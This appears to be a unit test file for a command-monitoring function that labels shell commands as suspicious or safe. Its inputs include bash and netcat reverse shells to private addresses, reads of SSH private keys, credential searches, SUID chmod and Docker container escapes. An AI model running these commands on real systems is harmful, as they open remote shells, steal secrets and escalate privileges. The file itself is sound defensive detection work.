import { describe, it, expect } from "vitest";
import { analyseCommand } from "../behaviour-monitor";

// analyseCommand is a pure function — no DB or audit calls needed

describe("behaviour monitor — analyseCommand", () => {
  // ── Non-suspicious commands ──────────────────────────────────────────────────

  it("passes a normal git command", () => {
    const result = analyseCommand("git status");
    expect(result.suspicious).toBe(false);
    expect(result.patterns).toHaveLength(0);
  });

  it("passes npm test", () => {
    const result = analyseCommand("npm test");
    expect(result.suspicious).toBe(false);
  });

  it("passes ls -la", () => {
    const result = analyseCommand("ls -la /workspace");
    expect(result.suspicious).toBe(false);
  });

  it("passes a file read command on a safe path", () => {
    const result = analyseCommand("cat /workspace/src/index.ts");
    expect(result.suspicious).toBe(false);
  });

  // ── SSH key access ──────────────────────────────────────────────────────────

  it("detects SSH key access via cat ~/.ssh/id_rsa", () => {
    const result = analyseCommand("cat ~/.ssh/id_rsa");
    expect(result.suspicious).toBe(true);
    expect(result.patterns.some((p) => p.type === "ssh_key_access")).toBe(true);
  });

  it("detects SSH key access via cat /root/.ssh/id_ed25519", () => {
    const result = analyseCommand("cat /root/.ssh/id_ed25519");
    expect(result.suspicious).toBe(true);
  });

  // ── Credential harvesting ───────────────────────────────────────────────────

  it("detects find with credential file extension search", () => {
    const result = analyseCommand("find / -name '*.pem' -exec cat {} \\;");
    expect(result.suspicious).toBe(true);
    expect(result.patterns.some((p) => p.type === "credential_harvesting")).toBe(true);
  });

  it("detects recursive grep for passwords", () => {
    const result = analyseCommand("grep -r password /etc");
    expect(result.suspicious).toBe(true);
  });

  it("detects environment dump with printenv", () => {
    const result = analyseCommand("printenv");
    expect(result.suspicious).toBe(true);
  });

  // ── Privilege escalation ────────────────────────────────────────────────────

  it("detects sudo -i privilege escalation", () => {
    const result = analyseCommand("sudo -i");
    expect(result.suspicious).toBe(true);
    expect(result.patterns.some((p) => p.type === "privilege_escalation")).toBe(true);
  });

  it("detects SUID chmod", () => {
    const result = analyseCommand("chmod 4755 /usr/local/bin/myapp");
    expect(result.suspicious).toBe(true);
  });

  it("detects world-writable chmod", () => {
    const result = analyseCommand("chmod 777 /etc/cron.d/backdoor");
    expect(result.suspicious).toBe(true);
  });

  // ── Reverse shells ──────────────────────────────────────────────────────────

  it("detects bash reverse shell", () => {
    const result = analyseCommand("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
    expect(result.suspicious).toBe(true);
    expect(result.patterns.some((p) => p.type === "unusual_egress")).toBe(true);
  });

  it("detects netcat reverse shell", () => {
    const result = analyseCommand("nc 192.168.1.1 4444 -e /bin/bash");
    expect(result.suspicious).toBe(true);
  });

  // ── Privileged Docker ───────────────────────────────────────────────────────

  it("detects privileged Docker container escape", () => {
    const result = analyseCommand("docker run --privileged -it ubuntu bash");
    expect(result.suspicious).toBe(true);
    expect(result.patterns.some((p) => p.type === "privilege_escalation")).toBe(true);
  });

  it("detects Docker root-mount escape", () => {
    const result = analyseCommand("docker run -v /:/host ubuntu chroot /host");
    expect(result.suspicious).toBe(true);
  });

  // ── Severity classification ─────────────────────────────────────────────────

  it("classifies SSH key access as critical", () => {
    const result = analyseCommand("cat ~/.ssh/id_rsa");
    const sshPattern = result.patterns.find((p) => p.type === "ssh_key_access");
    expect(sshPattern?.severity).toBe("critical");
  });

  it("classifies privilege escalation as critical", () => {
    const result = analyseCommand("sudo -i");
    const privPattern = result.patterns.find((p) => p.type === "privilege_escalation");
    expect(privPattern?.severity).toBe("critical");
  });
});
